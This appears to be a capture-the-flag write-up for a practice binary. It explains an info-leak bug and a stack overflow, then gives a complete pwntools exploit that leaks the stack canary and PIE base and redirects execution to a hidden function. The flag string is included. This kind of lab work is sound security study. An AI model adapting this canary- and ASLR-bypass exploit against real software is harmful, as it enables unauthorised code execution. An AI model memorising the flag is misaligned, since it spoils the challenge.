**Difficulty:** 1.6 | **Tools:** Ghidra, objdump, GDB, pwntools

## Challenge
Hidden function `open_batcave()` prints the flag but is never called
normally. Goal: hijack control flow to reach it via a stack overflow,
bypassing a stack canary and PIE/ASLR.

## Bugs Found
- `riddle_leak()`: `write(1, name, 0x40)` on a 32-byte buffer → leaks
  32 extra bytes of stack (canary + a return-into-`main` address).
- `check_password()`: `read(0, buffer, 700)` on a 64-byte buffer →
  classic stack overflow, enough to overwrite the return address.

## Approach
1. Leaked 64 bytes via `riddle_leak`. Split into 8-byte chunks —
   offset 40-47 = canary (`0x00` signature byte), offset 56-63 =
   return address into `main` (`0x5555...` PIE pattern).
2. Disassembly (`objdump -d`) confirmed `check_password`'s canary
   sits at `[rbp-0x8]`, buffer at `[rbp-0x50]` → **72-byte** gap
   (not the 64 I assumed at first — cost some trial and error).
3. Calculated PIE base from the leaked return address vs. its known
   static offset, then derived `open_batcave`'s real address.
4. Sent a 96-byte payload: 72 junk + real canary + 8 junk (saved
   RBP) + `open_batcave` address.

## Exploit
```python
from pwn import *

elf = ELF('./riddler_maze')
io = process('./riddler_maze')

io.recvuntil(b'name? ')
io.send(b'A' * 32)

io.recvuntil(b"A pleasure, '")
raw_leak = io.recvn(64)
chunks = [raw_leak[i:i+8] for i in range(0, 64, 8)]

canary_bytes = chunks[5]
leaked_return_addr = u64(chunks[7])

pie_base = leaked_return_addr - 0x141d
open_batcave_actual = pie_base + elf.symbols['open_batcave']

io.recvline()

payload  = b'A' * 72
payload += canary_bytes
payload += b'B' * 8
payload += p64(open_batcave_actual)

io.sendlineafter(b'code: ', payload)
io.interactive()
```

## Result
FLAG{0x8A7_P1E_L34K_4SLR_BYP4SS}


## Takeaway
Never assume buffer→canary offset from buffer size alone — always
confirm the exact `[rbp-X]` layout in disassembly. A single leak bug
can defeat canary + PIE together if it happens to expose both.
